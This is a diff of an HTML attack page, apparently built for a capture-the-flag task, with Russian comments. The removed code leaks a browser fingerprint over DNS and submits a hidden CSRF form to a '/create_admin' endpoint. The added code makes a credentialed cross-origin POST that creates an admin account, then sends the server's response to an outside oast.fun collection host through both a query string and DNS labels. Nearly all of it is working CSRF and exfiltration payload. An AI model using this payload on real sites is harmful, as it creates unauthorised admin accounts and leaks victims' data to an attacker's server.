@@ -2,38 +2,49 @@
 <html>
 <body>
 <script>
-/* === 1. минимальный набор (DNS не резиновый) === */
-const data =
-  navigator.userAgent.slice(0,30) + "|" +
-  Date.now();
+(async () => {
+  let respText = "";
+  let status = "ERR";
 
-/* === 2. base36 (DNS‑safe) === */
-const enc = [...data]
-  .map(c => c.charCodeAt(0).toString(36))
-  .join("-");
+  try {
+    const r = await fetch("https://tasks.goidactf.ru:20246/create_admin", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      body: "new_admin_login=ctfadmin_" + Date.now(),
+      credentials: "include",
+      mode: "cors"
+    });
 
-/* === 3. режем на DNS‑label === */
-const label = enc.slice(0,50);
+    status = r.status;
+    respText = await r.text();
 
-/* === 4. DNS‑exfil === */
-new Image().src =
-  "https://" + label +
-  ".zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
+  } catch (e) {
+    respText = "FETCH_ERR:" + e;
+  }
 
-/* === 5. CSRF === */
-const form = document.createElement("form");
-form.method = "POST";
-form.action = "https://tasks.goidactf.ru:20246/create_admin";
-form.style.display = "none";
+  /* ===== 1. QUERY‑EXFIL (полный ответ) ===== */
+  const full = btoa(unescape(encodeURIComponent(
+    status + "|" + respText
+  )));
 
-const input = document.createElement("input");
-input.type = "hidden";
-input.name = "new_admin_login";
-input.value = "ctfadmin_" + Date.now();
+  new Image().src =
+    "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?q=" +
+    encodeURIComponent(full);
 
-form.appendChild(input);
-document.body.appendChild(form);
-form.submit();
+  /* ===== 2. DNS‑EXFIL (коротко) ===== */
+  const short = (status + "|" + respText.slice(0,40))
+    .split("")
+    .map(c => c.charCodeAt(0).toString(36))
+    .join("-")
+    .slice(0,60);
+
+  new Image().src =
+    "https://" + short +
+    ".zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
+
+})();
 </script>
 </body>
 </html>
